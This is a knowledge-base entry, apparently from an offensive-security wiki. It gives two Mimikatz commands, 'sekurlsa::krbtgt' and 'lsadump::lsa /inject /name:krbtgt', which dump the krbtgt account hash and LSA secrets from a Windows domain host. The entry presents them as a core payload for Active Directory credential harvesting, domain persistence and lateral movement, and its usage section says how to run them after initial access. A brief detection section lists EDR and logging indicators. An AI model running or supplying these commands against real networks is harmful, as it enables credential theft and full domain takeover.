---
id: 9462ae43-6938-40bc-8058-5339a3b96e20
name: Mimikatz-Commands-Dump-Krbtgt-and-LSA-Secrets
type: code
language: mimikatz
verified: true
created_at: '2023-04-06T03:56:04.067173+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - active-directory
validated: true
---

# Mimikatz-Commands-Dump-Krbtgt-and-LSA-Secrets

## Code

```mimikatz
sekurlsa::krbtgt
lsadump::lsa /inject /name:krbtgt
```

## Description

This code snippet contains two sequential Mimikatz commands to dump the krbtgt account's NTLM hash using sekurlsa and then extract LSA secrets via lsadump injection. It is a core payload for Active Directory credential harvesting, enabling domain persistence and lateral movement.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /name:krbtgt | Targets the krbtgt account for LSA dumping | krbtgt |

(No other variables; commands are self-contained but require Mimikatz elevation.)

## Usage

Execute within an elevated Mimikatz session on a domain-joined Windows host. First run sekurlsa::krbtgt to get the hash, then lsadump::lsa /inject /name:krbtgt for secrets. Used in procedures like [[procedures/Dumping-AD-Domain-Credentials-using-Mimikatz-sekurlsa]] after initial access. Output can be logged or piped to files for analysis.

## Detection

- EDR alerts on Mimikatz process spawning or LSASS injection (e.g., via Sysmon Event ID 10 with lsass.exe as target).
- Command-line logging showing 'sekurlsa' or 'lsadump' strings.
- Memory forensics revealing LSASS dumps or unusual credential access patterns.
- Windows Defender or AV signatures for Mimikatz binaries.

## Related

- [[procedures/Dumping-AD-Domain-Credentials-using-Mimikatz-sekurlsa]]
- [[tools/Mimikatz]]
